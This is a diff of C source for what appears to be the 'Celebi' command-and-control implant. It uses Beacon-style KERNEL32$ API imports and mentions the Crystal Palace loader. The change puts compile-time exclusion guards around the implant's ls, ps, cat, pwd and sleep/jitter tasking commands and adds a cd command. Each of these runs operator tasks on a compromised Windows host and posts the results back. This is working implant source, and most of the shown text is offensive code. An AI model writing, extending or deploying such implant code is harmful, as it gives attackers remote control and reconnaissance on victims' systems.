@@ -14,6 +14,7 @@ WINBASEAPI BOOL WINAPI KERNEL32$FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DAT
 WINBASEAPI BOOL WINAPI KERNEL32$FindClose(HANDLE hFindFile);
 WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentDirectoryA(DWORD nBufferLength, LPSTR lpBuffer);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+WINBASEAPI BOOL WINAPI KERNEL32$SetCurrentDirectoryA(LPCSTR lpPathName);
 WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
 WINBASEAPI BOOL WINAPI KERNEL32$GetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize);
 WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
@@ -102,6 +103,7 @@ static void sb_free(StrBuf *b) {
 
 /* ---------------- ls ---------------- */
 
+#ifndef CELEBI_NO_LS
 void agent_ls(AgentState *state, TaskInfo *task) {
 	/* Big buffers live on the heap: large stack frames make mingw emit
 	 * ___chkstk_ms, which crystal palace cannot relocate. */
@@ -256,12 +258,14 @@ void agent_ls(AgentState *state, TaskInfo *task) {
 	KERNEL32$VirtualFree(parent_path, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(name, 0, MEM_RELEASE);
 }
+#endif /* CELEBI_NO_LS */
 
 /* ---------------- ps ---------------- */
 
 #define TH32CS_SNAPPROCESS 0x00000002
 #define PROCESS_QUERY_LIMITED_INFORMATION 0x1000
 
+#ifndef CELEBI_NO_PS
 void agent_ps(AgentState *state, TaskInfo *task) {
 	HANDLE snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (snap == INVALID_HANDLE_VALUE) {
@@ -352,12 +356,14 @@ void agent_ps(AgentState *state, TaskInfo *task) {
 	KERNEL32$VirtualFree(binpath, 0, MEM_RELEASE);
 	KERNEL32$VirtualFree(wp, 0, MEM_RELEASE);
 }
+#endif /* CELEBI_NO_PS */
 
 /* ---------------- cat ---------------- */
 
 #define FILE_SHARE_READ  0x00000001
 #define FILE_SHARE_WRITE 0x00000002
 
+#ifndef CELEBI_NO_CAT
 void agent_cat(AgentState *state, TaskInfo *task) {
 	if (task->parameters == NULL || task->parameters[0] == '\0' || task->parameters[0] == 0x09) {
 		agent_post(state, task, "missing file path", STR(STATUS_MISSING_COMMAND));
@@ -397,9 +403,11 @@ void agent_cat(AgentState *state, TaskInfo *task) {
 	agent_post(state, task, buf, STR(STATUS_SUCCESS));
 	KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
 }
+#endif /* CELEBI_NO_CAT */
 
 /* ---------------- pwd ---------------- */
 
+#ifndef CELEBI_NO_PWD
 void agent_pwd(AgentState *state, TaskInfo *task) {
 	char buf[1024];
 	if (KERNEL32$GetCurrentDirectoryA(sizeof(buf), buf) == 0) {
@@ -408,9 +416,11 @@ void agent_pwd(AgentState *state, TaskInfo *task) {
 	}
 	agent_post(state, task, buf, STR(STATUS_SUCCESS));
 }
+#endif /* CELEBI_NO_PWD */
 
 /* ---------------- change (sleep + jitter) ---------------- */
 
+#ifndef CELEBI_NO_CHANGE
 void agent_change(AgentState *state, TaskInfo *task) {
 	char *sleep_str = task->parameters;
 	char *jitter_str = NULL;
@@ -440,3 +450,25 @@ void agent_change(AgentState *state, TaskInfo *task) {
 	state->sleep_time = interval;
 	agent_post(state, task, "changed", STR(STATUS_SUCCESS));
 }
+#endif /* CELEBI_NO_CHANGE */
+
+/* ---------------- cd ---------------- */
+
+#ifndef CELEBI_NO_CD
+void agent_cd(AgentState *state, TaskInfo *task) {
+	if (task->parameters == NULL || task->parameters[0] == '\0' || task->parameters[0] == 0x09) {
+		agent_post(state, task, "missing path", STR(STATUS_MISSING_COMMAND));
+		return;
+	}
+	if (!KERNEL32$SetCurrentDirectoryA(task->parameters)) {
+		agent_post(state, task, "failed to change directory", STR(STATUS_COMMAND_FAILED));
+		return;
+	}
+	char buf[1024];
+	if (KERNEL32$GetCurrentDirectoryA(sizeof(buf), buf) == 0) {
+		agent_post(state, task, "changed", STR(STATUS_SUCCESS));
+		return;
+	}
+	agent_post(state, task, buf, STR(STATUS_SUCCESS));
+}
+#endif /* CELEBI_NO_CD */
